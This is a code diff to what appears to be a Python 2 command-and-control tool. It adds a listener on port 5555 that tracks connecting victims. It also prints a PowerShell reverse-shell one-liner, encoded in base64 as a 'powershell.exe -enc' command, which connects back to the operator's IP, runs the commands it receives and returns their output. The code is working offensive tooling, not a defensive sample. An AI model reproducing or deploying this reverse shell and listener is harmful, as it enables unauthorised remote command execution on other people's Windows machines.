@@ -4,20 +4,39 @@ import random
 import re
 import sys
 import os
+import time
 from threading import Thread
 from main import *
+from menu import *
 
+
+def startListener():
+    try:
+        time.sleep(0.25)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((FUNCTIONS().CheckInternet(), 5555))
+        s.listen(1)
+
+        with t.location(y=1):
+            print t.bold_red + "listening on port 5555" + t.normal
+        clientnumber = 0
+        while True:
+            clientconn, address = s.accept()
+            ip , port = address
+            if clientconn:
+                clientnumber += 1
+                with t.location(y=1):
+                    print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
+            from menu import clientMenuOptions
+            clientMenuOptions[clientnumber] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': None}
+        s.close()
+    except:
+        with t.location(y=1):
+            print t.bold_red + "Couldn't start Listener on port 5555" + t.normal
+
+"""
 def startSocket(ipaddr, port):
-    clientlist = []
-    clientnumber = 0
-    targetchoice = ''
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((ipaddr, int(port)))
-    s.listen(1)
-    print "listening port %s"%port
-    worker = Thread(target=runSocket,args=(s, clientlist, clientnumber))
-    worker.setDaemon(True)
-    worker.start()
+    startListener()
     printListener(ipaddr, port)
     print "Waiting for clients"
     while True:
@@ -57,19 +76,12 @@ def startSocket(ipaddr, port):
             else:
                 break
     s.close()
+"""
 
-def runSocket(s, clientlist, clientnumber):
-    while True:
-        clientconn, address = s.accept()
-        ip , port = address
-        if clientconn:
-            clientnumber += 1
-            print "\nconnection from %s %s"%(ip,port)
-        clientlist.append({'client':clientnumber,'clientinstance':clientconn,'clientaddress':ip,'clientport':port})
 
-def printListener(ipaddr,port):
+def printListener():
     windows_ps_rev_shell = (
-        "$client = New-Object System.Net.Sockets.TCPClient('" + ipaddr + "','" + str(port) + "');"
+        "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
         "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
         "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
         "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
@@ -78,3 +90,4 @@ def printListener(ipaddr,port):
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
     print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
+    return True
